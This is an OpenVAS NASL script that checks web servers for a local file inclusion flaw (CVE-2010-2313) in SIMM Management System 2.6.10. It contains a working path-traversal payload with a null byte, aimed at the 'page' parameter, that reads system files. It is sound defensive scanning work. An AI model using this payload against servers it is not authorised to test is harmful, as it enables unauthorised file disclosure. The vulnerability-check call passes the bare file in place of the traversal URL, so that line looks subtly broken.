if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901127" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-06-22 14:43:46 +0200 (Tue, 22 Jun 2010)" );
	script_cve_id( "CVE-2010-2313" );
	script_bugtraq_id( 40543 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "SIMM Management System 'page' Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/40009" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/59063" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/12848/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process." );
	script_tag( name: "affected", value: "Anodyne Productions SIMM Management System Version 2.6.10" );
	script_tag( name: "insight", value: "The flaw is caused by improper validation of user-supplied input
  via the 'page' parameter to 'index.php' when magic_quotes_gpc is disabled,
  that allows remote attackers to view files and execute local scripts in the context of the webserver." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running SIMM Management System and is prone to
  local file inclusion vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/sms", "/SMS", "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/index.php?page=main", port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(( ContainsString( res, "Powered by SMS 2" ) ) && ( ContainsString( res, ">Anodyne Productions<" ) )){
		files = traversal_files();
		for pattern in keys( files ) {
			file = files[pattern];
			url = NASLString( dir, "/index.php?page=../../../../../../../../../../../../../../../", file, "%00" );
			if(http_vuln_check( port: port, url: file, pattern: pattern )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( data: report, port: port );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

